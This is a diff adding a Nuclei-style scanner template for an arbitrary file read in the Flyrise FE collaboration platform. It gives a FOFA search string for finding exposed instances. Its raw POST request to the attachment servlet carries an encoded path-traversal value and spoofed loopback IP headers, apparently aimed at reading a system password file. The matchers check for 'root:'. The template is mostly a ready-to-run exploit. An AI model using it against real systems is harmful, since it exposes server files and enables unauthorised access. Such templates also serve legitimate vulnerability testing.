@@ -1,0 +1,38 @@
+id: flyrise-fe-platform-attachment-file-read
+
+info:
+  name: "飞企互联FE业务协作平台attachment接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="FE-协作平台"
+      FE办公协作平台为应用开发与信息管理的集成化系统。飞企互联FE业务协作平台attachment接口存在文件读取漏洞，攻击者可利用该漏洞读取服务器端任意文件内容，导致敏感数据泄露及系统权限被非法获取。
+  tags: 飞企互联FE业务协作平台
+
+http:
+- raw:
+  - |
+    POST /servlet/webchat/attachment/1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    X-Forwarded-For: 127.0.0.1
+    X-Originating-IP: 127.0.0.1
+    X-Remote-Addr: 127.0.0.1
+    X-Remote-IP: 127.0.0.1
+
+    mailAttachment=1&attachPK=/v8AMQAJAC8ACQAvAAkALwAJAC8ALgAuAC8ALgAuAC8ALgAuAC8AagBiAG8AcwBzAC8AdwBlAGIALwBmAGUALgB3AGEAcgAvAFcARQBCAC0ASQBOAEYALwBlAHQAYwAvAHAAcwBlAGQAdwBvAGwAZgAA
+
+  matchers-condition: or
+  matchers:
+    - type: word
+      part: body
+      words:
+        - "root:"
+
+    - type: word
+      part: body
+      words:
+        - "for 32-bit"
